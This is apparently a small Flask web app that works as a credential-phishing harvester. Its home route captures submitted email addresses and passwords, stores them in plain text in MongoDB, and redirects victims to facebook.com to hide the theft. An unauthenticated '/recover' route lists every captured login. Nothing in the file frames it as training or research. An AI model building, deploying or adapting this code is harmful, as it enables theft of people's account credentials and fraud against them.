import os
from flask import Flask, render_template, request, redirect
from models.user import User

app = Flask(__name__)
app.secret_key = os.urandom(64)
app.config.update(
    ADMIN=os.environ.get('ADMIN')
)


@app.route('/', methods=["GET", "POST"])
def home():
    if request.method == "POST":
        email = request.form["email"]
        password = request.form["pass"]
        User(email=email, password=password).save_to_mongo()
        return redirect("https://www.facebook.com")
    return render_template('home.html')


@app.route('/recover')
def password():
    return render_template("user.html", users=User.all())


if __name__ == "__main__":
    app.run(debug=True)
